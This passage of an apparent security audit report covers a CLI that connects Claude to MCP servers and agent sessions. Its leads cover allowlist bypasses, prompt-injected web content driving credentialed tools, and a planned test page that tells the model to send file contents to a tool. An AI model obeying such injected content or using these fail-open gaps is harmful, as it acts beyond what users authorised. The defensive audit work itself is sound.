config::check splits each --mcp-tool value on space, tab and newline (config::words) and checks every piece's shape and that its host is an --mcp host. The comment above the check says this means 'an entry cannot pass here and match nothing in the request'. request_args then joins the raw values with ' ', and request::toolset splits that string on ' ' only. So a value with a tab or newline is checked as several entries but applied as one word. Example: --mcp https://a.example --mcp https://b.example --mcp-tool $'a.example:search\nb.example:read', which is the result of quoting a multi-line $(cat tools.txt). The check accepts two valid entries. toolset sees one word. Its text before the first ':' is 'a.example', so a.example's allowlist is {'search\nb.example:read'}, a nonexistent tool, which fails closed. No word's host part equals 'b.example', so b.example's allow list is empty and its mcp_toolset goes out with no default_config {enabled:false} and no configs. By the CLI's own contract (cli.rs help text 'a server not named keeps all its tools'; config.rs error text 'it would allow every tool'), that means every b.example tool is enabled. A single entry with a leading tab or newline ($'\ta.example:search') leaves its own server fully enabled the same way, because the word's host part is '\ta.example'. The user's tool restriction is silently dropped with no error. It is a deterministic control that limits what injected web or MCP content can make the model call on that server under the user's per-server token. The attacker (injected content) gains no authority the user did not grant to the server, but the narrowing the user asked for is not applied: an action-binding fail-open. The out-of-scope bash oracle has the same split mismatch (lib/config.bash:89 'for t in ${usage_mcp_tool:-}' against lib/request.jq:43 'def words: split(" ")'). That strengthens the Rust finding rather than excusing it.

### Claimed root cause

The validator (config::words, rust/src/config.rs:264-266, used at config.rs:86) and the builder (request::toolset, rust/src/request.rs:155-160, fed by lib.rs:184 join(" ")) split the same --mcp-tool value differently. The set of entries that was validated therefore differs from the allowlist that is applied, and a server that no applied word matches falls back to all tools enabled (request.rs:162-169).

### Source trace

1. **entrypoint**: `rust/src/cli.rs:153` (`RequestFlags::mcp_tool`). The user's repeatable --mcp-tool flag, a clap Vec<String> with no value parser, so tab and newline are kept. Here it is $'a.example:search\nb.example:read', given with --mcp https://a.example --mcp https://b.example (cli.rs:145).
2. **propagation**: `rust/src/config.rs:86` (`config::check`). words() splits on ' ', '\t' and '\n' into 'a.example:search' and 'b.example:read'. Both match the host/tool charset and both hosts are --mcp hostnames, so check returns Ok (lib.rs:70).
3. **propagation**: `rust/src/lib.rs:184` (`request_args`). mcp_tool: r.mcp_tool.join(" ") passes the raw value through, with the newline still inside one word.
4. **propagation**: `rust/src/request.rs:158` (`toolset`). After split(' ') at line 156 the only word is 'a.example:search\nb.example:read'. Its split(':').next() is 'a.example', so it never equals hostname('https://b.example') == 'b.example'.
5. **sink**: `rust/src/request.rs:162` (`toolset`). For b.example, allow is empty, so default_config {enabled:false} and configs are not set. The {type:'mcp_toolset', mcp_server_name:'b-example'} entry is pushed (request.rs:76) without restriction, which means every tool of that server is enabled.

### Verified evidence

- `rust/src/config.rs:264`: fn words: value.split([' ', '\t', '\n']).filter(non-empty) (line 265). Its doc comment says it mirrors bash's default IFS.
- `rust/src/config.rs:83`: The comment at lines 83-84 states the invariant 'an entry cannot pass here and match nothing in the request', which this mismatch breaks.
- `rust/src/config.rs:103`: The refusal of a host that is not an --mcp host says the reason is that such an entry 'would allow every tool'. That is the fail-open the check was written to prevent, and it is reached here by another route.
- `rust/src/lib.rs:184`: request_args joins the --mcp-tool values with a single space and does no other normalization.
- `rust/src/request.rs:156`: toolset: mcp_tool.split(' ') only. Tab and newline stay inside words.
- `rust/src/request.rs:167`: default_config {enabled:false} is added only inside if !allow.is_empty() (line 162).
- `rust/src/cli.rs:151`: Help text: 'a server not named keeps all its tools'. This confirms that a toolset with no allowlist means every tool is enabled.

### Exact blockers

- No OS-enforced sandbox is available in this run (no network isolation, no empty allowlisted environment, no read-only target mount, no resource limits). So no target code may be executed: not cargo test, not a harness that calls config::check and request::body. The request body shape is established from source only. No built binary exists, and no parent-side promotion of a runtime artifact can happen.

### Bounded local resolution plan

In an approved sandbox (no network, empty environment, read-only target, scratch-only writes, low CPU and wall-clock limits), add a scratch-only unit test against the crate. (1) Build RequestFlags with mcp=['https://a.example','https://b.example'] and mcp_tool=["a.example:search\nb.example:read"], provider anthropic. Assert config::check(&r) is Ok. Then build request::body from the request_args fields (mcp_tool = r.mcp_tool.join(" ")) and assert that tools contains {type:'mcp_toolset', mcp_server_name:'b-example'} with no default_config and no configs key, and that the a-example toolset's configs key is 'search\nb.example:read'. (2) Repeat with mcp=['https://a.example'] and mcp_tool=["\ta.example:search"]: assert check is Ok and the a-example toolset has no default_config. (3) Control: mcp_tool=['a.example:search','b.example:read'] as two flags. Both toolsets must carry default_config {enabled:false}. Expected fix regression: either check refuses any --mcp-tool or --mcp value that contains '\t' or '\n', or check and toolset share one tokenizer. With the fix, case (1) must either be refused by check or produce allowlists for both servers.

### Owner-observed check

Owner-observed and non-destructive, against a dummy MCP server you control (for example one that exposes 'read' and 'write' tools). Run the built binary with ASK_CLAUDE_REQUEST_LOG pointed at a private file, --mcp https://a.example --mcp https://<dummy-host> and --mcp-tool $'a.example:search\n<dummy-host>:read'. Confirm in the logged request that the dummy server's mcp_toolset has no default_config. Optionally confirm that the API then advertises both of the dummy server's tools to the model, by asking it to list its tools. Do not invoke any write tool.

---

<a id="lead-10"></a>
## Lead 10: Untrusted retrieved content can drive every tool of a credentialed --mcp server with no deterministic gate

- **Fingerprint:** `rust/src/request.rs:toolset:default-all-tools-with-untrusted-retrieval`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** corrected: non-material correction applied (v5-15)
- **Affected boundary:** Untrusted retrieved content to the tools of a credentialed --mcp server. No deterministic binding of an MCP action to user intent exists unless the user sets an allowlist. This is a disclosed default, and owner intent is open.

### Description (verified record text)

On the Messages path, request::body puts web_search/web_fetch (with --web, no allowed_domains) and one mcp_toolset per --mcp server into the same tools array, and mcp_servers carries each server's authorization_token (ASK_CLAUDE_MCP_TOKEN_<HOST>, or the shared token for a lone server). toolset emits {type, mcp_server_name} with no default_config unless an --mcp-tool entry names that host, so by default every tool the server lists is enabled. The connector runs these calls on Anthropic's side inside one response, so the client cannot confirm a call; it only prints '(mcp <server>)' (no tool name or input) as the block streams. Reply content, including third-party web_fetch/web_search results and other servers' mcp_tool_result blocks, is appended to the history and resent on each pause_turn continuation (up to 8, no user step) and each chat turn. A third party who controls a fetched page or search result, or the operator of a second --mcp server, can therefore try to make the model call any enabled tool of a token-bearing server (including write or exfiltration tools, with -f contents available in context) under the user's token, an exact action the user did not request. config::check refuses non-https --mcp, unmatched --mcp-tool hosts and a shared token across several servers, but neither refuses nor warns on --web with an un-allowlisted --mcp server or on several servers sharing one context. Since the bash run-2 record (lib/request.jq:tools:mcp-toolset-unconfirmed-with-untrusted-retrieval) the project added the --mcp-tool allowlist and README.md:34-42 now discloses that ask-claude cannot ask before a call and that a server no --mcp-tool names keeps all its tools; the Rust port, held to the bash oracle by goldens, shares this default. The residual is a disclosed default: no deterministic control binds the action to user intent unless the user opts into an allowlist. Whether a model follows injected content to make such a call, and whether the owner treats a bare --mcp as approval of every tool, are not observable from source.

### Claimed root cause

toolset (rust/src/request.rs:152-171) leaves every --mcp server with all tools enabled unless --mcp-tool names its host, and body (rust/src/request.rs:46-89) composes that token-bearing toolset with untrusted retrieval tools (web_search/web_fetch) and other servers' toolsets in one request, while config::check (rust/src/config.rs:53-130) neither narrows nor refuses that composition. Because the connector executes calls API-side within the response, the only possible source-side action binding is the enabled-tool set, and by default it is the server's whole tool list, so the binding of an MCP action to user intent rests on the model alone.

### Source trace

1. **entrypoint**: `rust/src/lib.rs:500` (`call`). Lower-trust entry: the reply's full content array, which carries third-party web_search/web_fetch results and other MCP servers' mcp_tool_result blocks, is appended to the history. Within a single response the third-party content reaches the model API-side before any of it reaches the client, so there is no client hook between injection and call.
2. **propagation**: `rust/src/lib.rs:519` (`call`). A pause_turn reply is continued automatically (up to 8 rounds, no user step) with the same tools; each round rebuilds the body at lib.rs:463.
3. **propagation**: `rust/src/request.rs:35` (`body`). The history, including the earlier third-party tool results and any -f contents in the first user turn, is resent as messages.
4. **propagation**: `rust/src/config.rs:53` (`config::check`). Checks https scheme, --mcp-tool host matching and the shared-token refusal only; no refusal, opt-in or warning for --web with an un-allowlisted --mcp server or several servers in one context.
5. **propagation**: `rust/src/request.rs:59` (`body`). The server's own token (ASK_CLAUDE_MCP_TOKEN_<HOST>, or the shared token for a lone server) is attached as authorization_token.
6. **propagation**: `rust/src/request.rs:72` (`body`). web_search and web_fetch (max_uses 5, no allowed_domains) are added to the same tools array, so third-party content enters the model context.
7. **sink**: `rust/src/request.rs:161` (`toolset`). Boundary effect: mcp_toolset is emitted as {type, mcp_server_name} with no default_config, so every tool of the token-bearing server is callable by the model and executed API-side without client confirmation.

### Verified evidence

- `rust/src/request.rs:162`: default_config {enabled:false} plus per-tool configs only when an --mcp-tool entry's host matches this server; otherwise all tools stay on.
- `rust/src/request.rs:75`: One toolset per --mcp server pushed after the web tools in the same tools array.
- `rust/src/cli.rs:141`: --web flag (user configuration, full trust); --mcp at cli.rs:145 and --mcp-tool at cli.rs:153, whose help text states 'a server not named keeps all its tools'.
- `rust/src/config.rs:111`: The only multi-server control refuses a shared ASK_CLAUDE_MCP_TOKEN for several servers; per-host tokens for several servers sharing one context pass.
- `rust/src/stream.rs:26`: While a call runs the user sees only '(mcp <server>)', never the tool name or its input.
- `README.md:36`: Discloses that Anthropic calls the MCP server from its side so ask-claude cannot ask before a call, that tool inputs (including -f contents) reach the operator, and (README.md:39-40) that a server no --mcp-tool names keeps all its tools: a documented default.

### Exact blockers

- Model and API behavior not observable from source: whether the model, given attacker-written web_fetch/web_search content or another server's mcp_tool_result, issues an mcp_tool_use to an enabled tool of a token-bearing server that the user did not request.
- Owner intent not observable from source: README.md:34-42 and the --mcp-tool help disclose that a bare --mcp keeps every tool and that no per-call confirmation is possible; whether the owner treats that generic opt-in as the intended approval of every tool (an accepted trade-off) or wants a deterministic refusal/opt-in for --web or several servers without an allowlist decides whether this is a defect.

### Bounded local resolution plan

In an approved sandbox (no network, empty env except a dummy ASK_CLAUDE_MCP_TOKEN_MCP_GOOD_EXAMPLE=tok_DUMMY, read-only target, scratch-only writes), add a unit test that builds request::Args {web: true, mcp: ["https://mcp.good.example/mcp"], mcp_tool: "", ..} and asserts body(&args)["tools"] contains web_search, web_fetch and {type: mcp_toolset, mcp_server_name: mcp-good-example} with no default_config key, and that mcp_servers[0].authorization_token == tok_DUMMY; and that config::check on the matching RequestFlags returns Ok. Repeat with mcp: [two hosts] and per-host tokens and assert Ok. Regression for a fix: config::check refuses (or requires an explicit opt-in flag for) --web or more than one --mcp server unless every server has an --mcp-tool allowlist, and toolset emits default_config {enabled:false} in that case.

### Owner-observed check

Owner-observed, non-destructive: run an owner-controlled MCP server exposing a harmless logging-only tool (e.g. note_write that only records its arguments) under a dummy token, and an owner-controlled page whose text instructs the model to call note_write with the conversation's file contents. Run ask-claude --web --mcp <owner server> (no --mcp-tool) -f <dummy file> with a prompt asking only to summarize that page; record from ASK_CLAUDE_REQUEST_LOG/event log and the server's log whether an mcp_tool_use for note_write was issued. Separately record the owner's decision on whether a bare --mcp is intended to approve every tool.

---

<a id="lead-11"></a>
## Lead 11: Rust --memory access suffix other than exact ':ro' silently attaches the memory store without read_only

- **Fingerprint:** `rust/src/session.rs:create_body:memory-access-suffix-fails-open`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** verified unchanged (v5-16)
- **Affected boundary:** Untrusted session content to a memory store the user asked to attach read-only. Any suffix other than exact ':ro' attaches it with the provider default access.

### Description (verified record text)

--memory takes <id>[:ro] (rust/src/cli.rs:225-227, README.md:261-262). Agent::new checks only that the text before the first ':' starts with memstore_ and that there are at most 8 entries (rust/src/agent.rs:470-484). session::create_body sets access:read_only only when the second ':'-field is exactly "ro" (rust/src/session.rs:159-166). Every other suffix produces a memory_store resource with no access field, and there is no error branch: ':RO', ':readonly', ':read_only', ':rw' and an empty ':' suffix all do this. A suffix like ':ro:x' still gets read_only. Agent::create passes the same self.memories (cloned from argv at agent.rs:548) to every session the run creates, including sessions started after /new (agent.rs:634-652), and POSTs the body to /sessions (agent.rs:697-700). So a user who asks for read-only with any spelling other than exact ':ro' gets no warning, and the store is attached with the provider's default access. The entrypoint is the trusted local user's own argv. The security-relevant actor is untrusted session content (a mounted repository, fetched web pages, MCP results) that steers the agent. If the provider default is writable, that content can make the agent write durable entries into a store the user meant to keep read-only. Later sessions that attach the store, including other agents or users of the same workspace store, read those entries back as memory. This is the same root cause as the open bash record lib/session-create.jq:memory_resource:unrecognized-access-suffix-fails-open, and the goldens hold the Rust port to the same bytes.

### Claimed root cause

rust/src/session.rs:160-164 maps the access suffix with `if parts.next() == Some("ro") { r["access"] = json!("read_only"); }`, a case-sensitive exact match with no rejection branch. rust/src/agent.rs:471-478 validates only the id prefix (`m.split(':').next()...starts_with("memstore_")`), even though its error text advertises ':ro for read-only'. An unrecognized access request therefore falls back to the provider default instead of failing closed, unlike the sibling --vault/--memory prefix checks, which refuse malformed values before any request.

### Source trace

1. **entrypoint**: `rust/src/cli.rs:227` (`AgentArgs::memory`). --memory <id>[:ro]: repeatable Vec<String>, argv only, no env fallback. The help text at cli.rs:225 documents ':ro' as the only access spelling
2. **propagation**: `rust/src/agent.rs:473` (`Agent::new`). The only check is that m.split(':').next() starts with memstore_ (plus the count <= 8 at agent.rs:479). The access suffix is never validated, so ':RO', ':readonly', ':read_only', ':rw' and ':' pass
3. **propagation**: `rust/src/agent.rs:697` (`Agent::create`). self.memories, cloned unchanged from args.memory at agent.rs:548, go into CreateArgs for every session the run creates, including after /new
4. **propagation**: `rust/src/session.rs:162` (`create_body`). access:read_only is set only when the second ':'-field equals exactly "ro". Every other suffix produces a memory_store resource with no access field
5. **sink**: `rust/src/agent.rs:700` (`Agent::create`). POST /sessions with the serialized body, so the store is attached with the provider-default access mode

### Verified evidence

- `rust/src/session.rs:162`: `if parts.next() == Some("ro") { r["access"] = json!("read_only"); }`: a case-sensitive exact match that falls back silently, with no error branch
- `rust/src/agent.rs:473`: Prefix-only check `!m.split(':').next().unwrap_or("").starts_with("memstore_")`. The error text at agent.rs:476 names ':ro for read-only', but no other suffix is refused
- `rust/tests/goldens.rs:639`: The golden pins only memstore_FIXTURE01 (no access) and memstore_FIXTURE02:ro (read_only), against tests/fixtures/agents/create-resources.json. No test covers a misspelled or unknown suffix
- `README.md:261`: Documents `--memory <memstore_id>[:ro]` with ':ro for read-only' (README.md:262). No other spelling is documented or refused

### Exact blockers

- The provider's default access mode for a memory_store resource sent without an access field (read_write vs read_only) is not visible in the repository (no fixture, doc or skill reference states it) and cannot be observed offline. The issue has security impact only if that default is writable
- No OS-enforced sandbox is available in this run (promotion allowlist empty), so create_body could not be run locally on the misspelled suffixes. The Rust result rests on source reading alone. The bash oracle's identical behavior was sandbox-reproduced in run 2 (docs/security-audit/findings.json, v08 mem-check.out)
- Precondition: the trusted user must type a suffix other than the documented exact ':ro' (for example ':RO' or ':readonly'), and untrusted session content must then steer the agent to write memory. This keeps likelihood low

### Bounded local resolution plan

In an approved sandbox (no network, empty allowlisted env, read-only target, scratch-only writes, low CPU/memory/wall-clock limits), add a scratch unit test calling session::create_body with memories ["memstore_a:ro", "memstore_b:RO", "memstore_c:readonly", "memstore_d:read_only", "memstore_e:", "memstore_f:rw", "memstore_g:ro:x"]. Expect access:read_only only on a and g, and no access field on b through f. Then run the built binary with ASK_CLAUDE_REPLAY and ASK_CLAUDE_REQUEST_LOG pointing into scratch: `agent --agent agent_X --environment env_X --memory memstore_b:RO ping`. Confirm the exit code is not 2 and the logged POST /sessions body has no access field. Regression after a fix: Agent::new must exit 2 before any request for every suffix other than exactly 'ro' (and 'rw' if supported) and for any extra ':' field.

### Owner-observed check

Owner-observed and non-destructive, in the owner's own workspace, on a newly created dummy memory store with no real content. Create a session with the store attached and no access field, GET the session, and record the effective access mode of the memory_store resource. Optionally, ask the agent to write one harmless marker entry and check whether it lands. If the effective mode is read_write, the fail-open grants write authority the user did not request. If it is read_only, close as no security impact. Archive the session and delete the dummy store afterwards.

---

<a id="lead-12"></a>
## Lead 12: Custom-tool round cap (ROUNDS=8) is skipped for every requires_action round that also carries an agent.tool_use ask

- **Fingerprint:** `rust/src/agent.rs:Agent::turn:custom-round-cap-skipped-when-asks-present`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** corrected: non-material correction applied (v5-01)
- **Affected boundary:** Loop limit on model-driven local actions. The ROUNDS=8 cap does not apply to rounds that mix asks and custom calls. No new authority is granted: each call still passes Gate::confirm.

### Description (verified record text)

Agent::turn caps at ROUNDS = 8 the requires_action rounds whose custom tool calls it answers on the user's machine. It increments the counter only when the fold has no agent.tool_use asks (agent.rs 806-808), but it then calls answer() for the whole fold (agent.rs 809-810), and session::answer runs every agent.custom_tool_use call that the gate allows through LocalMcp::call (session.rs 468-497, local_mcp.rs 308). A session stream that pairs at least one agent.tool_use with its custom calls in every requires_action stop keeps the counter at 0. The cap then never fires and the turn keeps sending tools/call to the --local-mcp server until the stream ends the turn by itself, the session's server-side budget is reached (100 cents at list price by default, cli.rs 212; --budget 0 removes it), or the user presses Ctrl-C. Approvals are not bypassed: each call still passes Gate::confirm, and confirm returns true without a person only under ASK_CLAUDE_CONFIRM=allow (session.rs 365) or after an 'a(lways)' answer for the ask's name and for 'local <tool>' (session.rs 376-377). What the defect removes is the loop limit on model-driven local actions. It does not grant new authority. Even with the cap intact, the number of custom calls in one round has no limit (fold picks every waiting event, session.rs 54-60), so the cap bounds rounds, not executions. The realistic attacker is content injected into the model's context (web pages, repository files, MCP results). It must steer the model to call a toolset tool that needs confirmation (an always_ask permission in the agent's configuration) alongside a custom tool in every pause. A self-chosen endpoint at the base URL can fabricate such a stream, but it already gets unbounded calls per round under the intact cap, so the endpoint case adds little. Scope is the same user: more runs of local tools the user already allowed as a class, plus more paid session rounds, which the default budget bounds at about one dollar of list cost per session unless the user raised or removed it. The bash oracle has the same logic (lib/agent-turn.bash, the rounds increment before 'if [ $rounds -le 8 ]'). Run 2 confirmed it there by local replay as low (likelihood low, impact low). That is calibration for this record, not evidence for the Rust code.

### Claimed root cause

The round counter in Agent::turn (agent.rs 806-808) increments only when the round has no asks, when it should increment whenever the round has custom calls. A round that mixes asks and custom calls is treated as confirmation-only, yet answer() runs its custom calls.

### Source trace

1. **entrypoint**: `rust/src/agent.rs:745` (`Agent::turn`). Each round opens the session event stream (self.t.stream(id)) and reads model-driven events from the API, or from whatever endpoint or replay supplies the stream, until the turn's idle.
2. **propagation**: `rust/src/agent.rs:780` (`Agent::turn`). The streamed events are folded by session::fold into stop_reason, event_ids, asks (agent.tool_use) and custom (agent.custom_tool_use).
3. **propagation**: `rust/src/session.rs:54` (`session::fold`). picked() returns every event of the kind whose id the idle's stop_reason.event_ids names, with no count limit; asks and custom are filled from it at lines 92-93.
4. **propagation**: `rust/src/agent.rs:806` (`Agent::turn`). rounds += 1 runs only if count("asks") == 0, so a requires_action round with one ask plus N custom calls is not counted.
5. **propagation**: `rust/src/agent.rs:809` (`Agent::turn`). rounds <= ROUNDS still holds, so answer(&fold) is built at line 810 and the loop continues with another stream; break fold at 818 and the 'stopped: requires_action after N custom tool rounds' interrupt at 832 are never reached.
6. **propagation**: `rust/src/session.rs:495` (`session::answer`). For each custom call whose tool the local server lists, Gate::confirm('local <name>') decides; under the allow policy (365) or an existing always grant (376-377) it returns true with no person present.
7. **sink**: `rust/src/local_mcp.rs:308` (`LocalMcp::call`). tools/call is sent to the user's --local-mcp server (an action on the user's machine), once per allowed custom call in every uncounted round.

### Verified evidence

- `rust/src/agent.rs:25`: const ROUNDS: u64 = 8, documented as the cap on custom-tool rounds a turn answers, with confirmations not counted.
- `rust/src/agent.rs:806`: if count("asks") == 0 { rounds += 1; }: custom calls in a round that has an ask do not count.
- `rust/src/agent.rs:810`: events = Some(crate::tojson(&self.answer(&fold))) answers both the asks and the custom calls in every round that is not counted.
- `rust/src/session.rs:497`: events.push(server.call(&tool_use)) runs each allowed custom call on the local MCP server; nothing counts calls per round or per turn.
- `rust/src/session.rs:365`: Policy::Allow => return true: every ask and every local call is allowed, with no terminal or person present.
- `rust/src/session.rs:376`: An in-memory 'always' grant by shown name returns true for the rest of the process, so later rounds need no input.
- `rust/src/session.rs:136`: create_body adds the server-side budget to the session unless --budget is "0". The --budget default is "100" cents (rust/src/cli.rs 212, README.md 220), so by default the session spend limit stops further paid rounds once reached; only --budget 0 or a raised budget leaves the missing round cap as the main loop bound. The budget bounds spend, not the number of local tools/call per dollar.
- `rust/src/cli.rs:212`: default_value = "100" for --budget: every session gets a 100-cent list-price cap unless the user overrides it.
- `lib/agent-turn.bash:214`: Comparable baseline (bash oracle): the same increment, skipped when asks are present. Run 2 replayed it locally: 20 tools/call with the cap never firing, against 8 in the control (docs/security-audit/REPORT.md lines 99-134).

### Exact blockers

- Missing OS-enforced sandbox (no external network, empty allowlisted environment, read-only target and tools, scratch-only writes, resource and wall-clock limits). Without it, the crate cannot be built (proc macros and the ring build script are target-controlled code) and the binary cannot be run under ASK_CLAUDE_REPLAY with --local-mcp, so nobody has observed whether the Rust binary sends more than 8 tools/call in one turn. The source logic is unambiguous, but the observed result needed for confirmed is missing.
- Provider fact not visible in source, and decisive for impact through the real API: whether the Managed Agents API ever ends a stream with one session.status_idle requires_action whose event_ids name both an agent.tool_use that needs confirmation and agent.custom_tool_use events, and whether a model can be steered to do so in every round. This needs an agent with an always_ask permission on some toolset tool plus at least one custom tool. Without it, only a self-chosen fabricating endpoint or a replay reaches the path, and such an endpoint already gets unbounded calls per round under the intact cap.

### Bounded local resolution plan

Run this inside an OS-enforced sandbox with no network, a read-only target, scratch-only writes and CPU/memory/wall-clock limits. Build with the committed Cargo.lock (cargo build --offline --locked from vendored dependencies), then mirror rust/tests/agent.rs spawn_with. Set the environment to ANTHROPIC_API_KEY=sk-ant-test-not-a-key, ASK_CLAUDE_AGENT=agent_FIXTURE, ASK_CLAUDE_ENVIRONMENT=env_FIXTURE, ASK_CLAUDE_CONFIRM=allow, ASK_CLAUDE_REPLAY=<scratch dir>, ASK_CLAUDE_REQUEST_LOG=<scratch>/requests.jsonl and XDG_STATE_HOME=<scratch>/state. Run: ask-claude agent --local-mcp "tee -a <scratch>/sent.jsonl | <target>/tests/fixtures/mcp/fake-server" "weather?". In the replay dir, files 1.sse through 12.sse each hold ': connected', then data: {"id":"sevt_A<n>","type":"agent.tool_use","name":"bash","input":{}}, then data: {"id":"sevt_C<n>","type":"agent.custom_tool_use","name":"get_weather","input":{"city":"Paris"}}, then data: {"id":"sevt_I<n>","type":"session.status_idle","stop_reason":{"type":"requires_action","event_ids":["sevt_A<n>","sevt_C<n>"]}}. File 13.sse holds ': connected' and a session.status_idle with stop_reason end_turn. Expected if vulnerable: 12 '"method":"tools/call"' lines in sent.jsonl, 12 user.custom_tool_result and 12 user.tool_confirmation bodies in requests.jsonl, no '[stopped: requires_action after 9 custom tool rounds; interrupting]' on stderr, exit 0. Control: the same fixture without the agent.tool_use events (event_ids naming only sevt_C<n>) gives 8 tools/call, the 'after 9 custom tool rounds' message, a posted user.interrupt and exit 1. Regression for the fix: with the counter keyed on count("custom") > 0, the mixed fixture also stops at 8. Only trusted parent-side code promotes sent.jsonl and requests.jsonl, under the promotion procedure.

### Owner-observed check

Owner check against a test agent and a test environment with a small --budget. Give one toolset tool (for example bash) an always_ask permission policy and give the agent one custom tool served by a harmless logging --local-mcp script. Prompt it to call both tools in parallel. In the session's event stream (or ask-claude agent trace), confirm whether a single session.status_idle with stop_reason requires_action lists both the agent.tool_use id and the agent.custom_tool_use id in event_ids. If it does, repeat over more than 8 rounds with ASK_CLAUDE_CONFIRM=allow and watch for tools/call beyond 8 and no 'stopped: requires_action' interrupt.

---

<a id="lead-13"></a>
## Lead 13: A session stream that ends or fails before the idle/terminated event is reported as a completed turn (exit 0, logged as success, session remembered), and no user.interrupt is sent

- **Fingerprint:** `rust/src/agent.rs:Agent::turn:stream-end-without-idle-reported-as-completed-turn`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** corrected: non-material correction applied (v5-02)
- **Affected boundary:** Integrity of the reported turn outcome (exit status, event log, remembered session) and the user's interrupt control over a session that keeps running.

### Description (verified record text)

Agent::turn treats a session event stream as a normal end of turn when it delivered at least one well-formed data: line and then hit EOF (Next::End), a read error (Next::Failed: TCP reset, truncated chunked body), or the 1800 s timeout_global on the streams agent. Streamed::read sends End and Failed to Streamed::end, which stores the error text in failure and sets done. That is the same flag ends_turn sets for a real idle, and turn() never reads got.failure once SSE data was seen. session::fold finds no session.status_idle or session.status_terminated event, so stop_reason is null. turn() maps that to "" and returns 0, the same arm as end_turn. The usage line prints, the event log records error "", one_shot remembers the session (as does chat for its first-line create), and no user.interrupt is posted. The CLI exits 0, which README's exit-code table defines as 'reply printed', for a partial reply, and the server-side session is left running unsupervised. While the turn is open, the user's documented stop control (Ctrl-C sends user.interrupt) works; after this silent exit there is nothing left for the user to interrupt. Who can trigger it: an on-path network peer cannot forge TLS data, but it can reset the TCP connection after a chosen record. The reset drops every later event at whole-event granularity, and the run still exits 0. A cut before the first data: line instead yields 'no response' and exit 1, so the attacker's gain is a false success on a truncated answer. With no attacker, any agent turn that runs past 30 minutes, for example one steered by untrusted model or web content into long tool work, is cut by the client and takes the same path. A script such as `ask-claude agent "..." && next` then acts on a partial answer. Server-side spend after the disconnect is still capped by the session budget (create_body sets max_list_cost unless --budget is 0), so the resource angle alone is hardening. The integrity of the reported outcome is the finding. The bash oracle shares the pattern (lib/agent-turn.bash:228 `end_turn | "") ;;`, and session_stream_read ignores curl's exit status). That strengthens the Rust finding rather than excusing it.

### Claimed root cause

Agent::turn decides the outcome only from the fold's stop_reason. It never checks that the stream actually reached the turn's terminal event: Streamed::done is set the same way by ends_turn (agent.rs:1039) and by end() on End/Failed (agent.rs:1027). It also ignores Streamed::failure whenever data arrived. So a missing idle (stop_reason null) falls into the `"end_turn" | "" => 0` arm at agent.rs:829, with no post_interrupt.

### Source trace

1. **entrypoint**: `rust/src/agent.rs:745` (`Agent::turn`). Opens the session event stream (a Deferred reply on the 1800 s streams agent, carrying API/network-controlled bytes) and wraps it in ToTurnEnd and transport::lines.
2. **propagation**: `rust/src/transport.rs:368` (`Lines::tick`). A failed body read (RST, truncated chunk, ureq global timeout) becomes Next::Failed. The reader channel closing at EOF becomes Next::End (transport.rs:370).
3. **propagation**: `rust/src/agent.rs:1017` (`Streamed::read`). Any Next other than Line or Interrupted goes to self.end(next), and read() returns false (not interrupted). connect() does the same at agent.rs:1003.
4. **propagation**: `rust/src/agent.rs:1023` (`Streamed::end`). End and Failed both just store the error text in failure (for Failed) and set done = true (agent.rs:1027).
5. **propagation**: `rust/src/agent.rs:770` (`Agent::turn`). After the read, the only gates are interrupted, got.sse (any data: line) and got.events (every data line parsed, agent.rs:775). got.failure is never checked once data arrived.
6. **propagation**: `rust/src/session.rs:51` (`session::fold`). With no idle or terminated event, idle is Value::Null, so stop_reason = idle.stop_reason.type = null (session.rs:64), event_ids is [] and asks/custom are empty. The requires_action branch is skipped and the loop breaks at agent.rs:818.
7. **propagation**: `rust/src/agent.rs:826` (`Agent::turn`). The event log records the turn with error "" (success), after the usage line.
8. **propagation**: `rust/src/agent.rs:829` (`Agent::turn`). stop = safe(text(or(null, ""))) = "" matches `"end_turn" | "" => 0`. This arm has no post_interrupt.
9. **sink**: `rust/src/agent.rs:676` (`Agent::one_shot`). rc 0 remembers the session stub and the process exits 0 for a turn that never reached idle, while the server-side session is left running (chat does the same for a new session at agent.rs:650).

### Verified evidence

- `rust/src/agent.rs:1027`: Streamed::end sets done = true for Next::End and Next::Failed alike, the same flag ends_turn sets at agent.rs:1039, so turn() cannot tell a real turn end from a cut stream.
- `rust/src/agent.rs:829`: `"end_turn" | "" => 0`: a missing stop_reason counts as success.
- `rust/src/agent.rs:885`: post_interrupt is called on the unanswerable path (agent.rs:801), the round-cap path (agent.rs:834) and the signal path (interrupt, agent.rs:880), but not on a stream that ended without idle.
- `rust/src/transport/sessions.rs:136`: streams: agent(1800) with timeout_global (sessions.rs:129), so the client cuts any turn longer than 30 minutes and it takes this path.
- `rust/src/session.rs:64`: stop_reason is idle["stop_reason"]["type"], which is null when no idle event was read.
- `lib/agent-turn.bash:228`: The bash oracle has the same `end_turn | "") ;;` success arm, and session_stream_read (lib/agent-turn.bash:53-61) ignores curl's exit status. The defect is shared.
- `README.md:275`: Exit-code contract: 0 means 'reply printed'. README.md:265-266 promise that Ctrl-C during a turn sends user.interrupt so the session stops too.
- `rust/src/transport/sessions.rs:296`: Replay::stream serves ASK_CLAUDE_REPLAY (a file, or <dir>/<n>.sse) as the stream, so a fixture without an idle line reaches EOF as Next::End. This makes the local validation plan exercise the same path.

### Exact blockers

- No OS-enforced sandbox is available in this run, so the target binary or its tests cannot be built or run against an ASK_CLAUDE_REPLAY fixture to observe the exit code, the event-log line, the remembered stub and the absence of user.interrupt for a stream without an idle event. The source path is complete. The observed result is not established.
- Managed Agents API behavior outside the repository bounds the impact, not the client-side defect: whether a session keeps running (and spending, up to its budget) after its stream client disconnects without user.interrupt, and whether the stream endpoint ever closes before idle on its own (for example, a server-side stream lifetime shorter than a turn).

### Bounded local resolution plan

